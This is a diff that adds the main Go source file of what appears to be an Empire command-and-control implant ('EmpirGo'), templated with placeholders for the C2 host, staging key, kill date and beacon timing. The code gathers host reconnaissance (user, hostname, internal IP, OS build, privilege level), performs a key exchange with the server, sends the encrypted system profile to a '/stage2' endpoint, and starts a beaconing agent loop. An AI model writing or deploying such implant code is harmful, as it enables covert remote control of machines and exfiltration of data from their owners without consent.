@@ -1,0 +1,156 @@
+package main
+
+import (
+	"EmpirGo/agent"
+	"EmpirGo/common"
+	"EmpirGo/comms"
+	"bytes"
+	"encoding/base64"
+	"fmt"
+	"github.com/gonutz/w32/v2"
+	"math/big"
+	"net"
+	"net/http"
+	"os"
+	"path/filepath"
+	"runtime"
+	"strings"
+	"unsafe"
+	"golang.org/x/sys/windows"
+)
+
+func getSysinfo(server string, nonce string) string {
+	hostname, _ := os.Hostname()
+	username := os.Getenv("USERNAME")
+	processID := os.Getpid()
+	language := "go"
+	processName := filepath.Base(os.Args[0])
+	operatingsystem := runtime.GOOS
+	v := w32.RtlGetVersion()
+	osDetails := fmt.Sprintf("%s %d Build:%d", operatingsystem, v.MajorVersion, v.BuildNumber)
+	internalIP := getIP()
+	architecture := runtime.GOARCH
+	version := "1.23"
+
+	hi, err := IsHighIntegrity()
+	if err != nil {
+		hi = false
+	}
+	highIntegrity := fmt.Sprintf("%t", hi)
+
+	return fmt.Sprintf("%s|%s|%s|%s|%s|%s|%s|%s|%s|%d|%s|%s|%s",
+		nonce, server, "", username, hostname, internalIP, osDetails, highIntegrity, processName, processID,
+		language, version, architecture)
+}
+
+func getIP() string {
+	addrs, _ := net.InterfaceAddrs()
+	for _, addr := range addrs {
+		if ipNet, ok := addr.(*net.IPNet); ok && !ipNet.IP.IsLoopback() {
+			if ipNet.IP.To4() != nil {
+				ip := ipNet.IP.String()
+				if !strings.HasPrefix(ip, "169.254") {
+					return ip
+				}
+			}
+		}
+	}
+	return ""
+}
+
+func IsHighIntegrity() (bool, error) {
+	const (
+		SECURITY_MANDATORY_HIGH_RID = 0x00003000
+	)
+
+	hProc := windows.CurrentProcess()
+
+	var tok windows.Token
+	if err := windows.OpenProcessToken(hProc, windows.TOKEN_QUERY, &tok); err != nil {
+		return false, err
+	}
+	defer tok.Close()
+
+	var outLen uint32
+	err := windows.GetTokenInformation(tok, windows.TokenIntegrityLevel, nil, 0, &outLen)
+	if err != windows.ERROR_INSUFFICIENT_BUFFER {
+		return false, err
+	}
+
+	buf := make([]byte, outLen)
+	if err := windows.GetTokenInformation(tok, windows.TokenIntegrityLevel, &buf[0], outLen, &outLen); err != nil {
+		return false, err
+	}
+
+	type tokenMandatoryLabel struct {
+		Label windows.SIDAndAttributes
+	}
+	tml := (*tokenMandatoryLabel)(unsafe.Pointer(&buf[0]))
+	sid := tml.Label.Sid
+
+	subAuthCount := *(*uint8)(unsafe.Pointer(uintptr(unsafe.Pointer(sid)) + 1))
+	lastRID := *(*uint32)(unsafe.Pointer(uintptr(unsafe.Pointer(sid)) + uintptr(8+int(subAuthCount-1)*4)))
+
+	return lastRID >= SECURITY_MANDATORY_HIGH_RID, nil
+}
+
+func main() {
+	profile := "{{ PROFILE }}"
+	server := "{{ HOST }}"
+	sessionID := "{{ SESSION_ID }}"
+	killDate := "{{ KILL_DATE }}"
+	workingHours := "{{ WORKING_HOURS }}"
+	delay := {{ DELAY }}
+	jitter := {{ JITTER }}
+	lostLimit := {{ LOST_LIMIT }}
+    stagingKeyBase64 := "{{ STAGING_KEY | safe }}"
+	defaultResponse := "{{ DEFAULT_RESPONSE }}"
+
+	stagingKey, err := base64.StdEncoding.DecodeString(stagingKeyBase64)
+	if err != nil {
+		fmt.Println("Error decoding stagingKey:", err)
+		return
+	}
+
+	sessionKey, newSessionID, nonce, err := comms.PerformDHKeyExchange(server, sessionID, stagingKey)
+	if err != nil {
+		fmt.Println("Error performing DH key exchange:", err)
+		return
+	}
+
+	// Update session ID from DH response
+	if newSessionID != "" {
+		sessionID = newSessionID
+	}
+
+	packetHandler := comms.PacketHandler{
+		MissedCheckins: 0,
+		Server:         server,
+		StagingKey:     stagingKey,
+		SessionID:      sessionID,
+		Aeskey:         sessionKey,
+	}
+
+	nonceStr := string(nonce)
+	nonceInt, _ := new(big.Int).SetString(nonceStr, 10)
+	nonceInt.Add(nonceInt, big.NewInt(1))
+	nonceStr = nonceInt.String()
+
+	sysInfo := getSysinfo(packetHandler.Server, nonceStr)
+	sysInfoBytes := []byte(sysInfo)
+
+	encryptedSysInfo := common.AesEncryptThenHMAC(sessionKey, sysInfoBytes)
+
+	// Build and send routing packet for Stage 2
+	routingPacket := packetHandler.BuildRoutingPacket(stagingKey, sessionID, 3, encryptedSysInfo)
+	postURL := server + "/stage2"
+	_, _ = http.Post(postURL, "application/octet-stream", bytes.NewReader(routingPacket))
+
+	messagesender, err := comms.NewHttpMessageSender(server, make(map[string]string), profile)
+
+	newAgent := agent.NewMainAgent(packetHandler, messagesender, sessionID, killDate, workingHours, delay, jitter, lostLimit, sessionKey, defaultResponse)
+
+	go newAgent.Run()
+
+	select {}
+}
